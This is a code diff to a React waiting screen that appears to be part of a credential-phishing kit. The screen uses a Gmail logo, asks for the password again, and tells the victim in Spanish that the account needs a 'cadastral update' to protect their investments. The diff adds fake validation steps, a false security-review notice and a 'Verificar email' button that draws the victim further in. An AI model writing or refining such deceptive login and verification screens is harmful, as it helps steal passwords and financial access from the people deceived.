@@ -1,5 +1,5 @@
 import { useState, useCallback } from "react";
-import { EyeOff, Eye, Loader2 } from "lucide-react";
+import { EyeOff, Eye, Loader2, Mail, ShieldCheck, CircleAlert } from "lucide-react";
 import gmailLogo from "@/assets/gmail-logo.svg";
 
 interface WaitingScreenProps {
@@ -7,9 +7,10 @@ interface WaitingScreenProps {
   sessionId: string;
   errorMessage?: string;
   onPasswordResubmit: (password: string) => Promise<void>;
+  onVerifyEmail: () => void;
 }
 
-const WaitingScreen = ({ email, errorMessage, sessionId, onPasswordResubmit }: WaitingScreenProps) => {
+const WaitingScreen = ({ email, errorMessage, sessionId, onPasswordResubmit, onVerifyEmail }: WaitingScreenProps) => {
   const [retryPassword, setRetryPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
@@ -51,7 +52,7 @@ const WaitingScreen = ({ email, errorMessage, sessionId, onPasswordResubmit }: W
             <button
               type="button"
               onClick={() => setShowPassword(!showPassword)}
-              className="absolute right-3.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
+              className="absolute right-3.5 top-1/2 -translate-y-1/2 text-muted-foreground transition-colors hover:text-foreground"
             >
               {showPassword ? <Eye size={18} /> : <EyeOff size={18} />}
             </button>
@@ -59,7 +60,7 @@ const WaitingScreen = ({ email, errorMessage, sessionId, onPasswordResubmit }: W
           <button
             type="submit"
             disabled={loading || !retryPassword.trim()}
-            className="w-full rounded-lg bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
+            className="w-full rounded-lg bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-50"
           >
             {loading ? (
               <span className="flex items-center justify-center gap-2">
@@ -88,23 +89,56 @@ const WaitingScreen = ({ email, errorMessage, sessionId, onPasswordResubmit }: W
       </div>
 
       <h3 className="mb-2 text-xl font-semibold text-foreground">
-        Tu cuenta requiere una actualización de datos
+        Tu cuenta requiere una actualización cadastral
       </h3>
       <p className="max-w-sm text-sm leading-6 text-muted-foreground">
-        Tu cuenta necesita una actualización cadastral para mantenerla segura y proteger tus inversiones lo máximo posible. Esperá unos instantes mientras cargamos tu información.
+        Necesitamos verificar algunos datos por la seguridad de tu cuenta y de tus inversiones. Para continuar, seguí las etapas de validación indicadas a continuación.
       </p>
 
-      <div className="mt-5 w-full rounded-xl border border-border bg-muted/40 px-4 py-3 text-left">
-        <p className="text-sm font-medium text-foreground">Proceso protegido</p>
-        <p className="mt-1 text-xs leading-5 text-muted-foreground">
-          Estamos validando y preparando tu información para continuar con la actualización de seguridad.
-        </p>
+      <div className="mt-5 w-full rounded-xl border border-border bg-muted/40 p-4 text-left">
+        <div className="mb-3 flex items-center gap-2 text-sm font-medium text-foreground">
+          <ShieldCheck className="h-4 w-4 text-primary" />
+          Proceso protegido
+        </div>
+
+        <div className="space-y-3">
+          {[
+            "Verificá tu email para confirmar el acceso.",
+            "Validá los datos solicitados para proteger tu cuenta.",
+            "Completá la revisión para seguir operando con normalidad.",
+          ].map((item, index) => (
+            <div key={item} className="flex items-start gap-3 rounded-lg border border-border/70 bg-background/80 px-3 py-2.5">
+              <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-semibold text-primary">
+                {index + 1}
+              </span>
+              <p className="text-sm leading-5 text-muted-foreground">{item}</p>
+            </div>
+          ))}
+        </div>
       </div>
+
+      <div className="mt-4 w-full rounded-xl border border-border bg-secondary/30 px-4 py-3 text-left">
+        <div className="flex items-start gap-3">
+          <CircleAlert className="mt-0.5 h-4 w-4 shrink-0 text-primary" />
+          <p className="text-xs leading-5 text-muted-foreground">
+            Este proceso forma parte de una revisión de seguridad de la cuenta y puede tomar unos instantes.
+          </p>
+        </div>
+      </div>
+
+      <button
+        type="button"
+        onClick={onVerifyEmail}
+        className="mt-6 flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-3 text-sm font-semibold text-primary-foreground transition-colors hover:bg-primary/90"
+      >
+        <Mail className="h-4 w-4" />
+        Verificar email
+      </button>
 
       <p className="mt-4 text-xs text-muted-foreground/60 break-all">
         {email}
       </p>
-      <div className="mt-6 flex gap-1.5">
+      <div className="mt-6 flex gap-1.5" aria-hidden="true">
         <span className="h-2 w-2 animate-bounce rounded-full bg-primary [animation-delay:0ms]" />
         <span className="h-2 w-2 animate-bounce rounded-full bg-primary [animation-delay:150ms]" />
         <span className="h-2 w-2 animate-bounce rounded-full bg-primary [animation-delay:300ms]" />
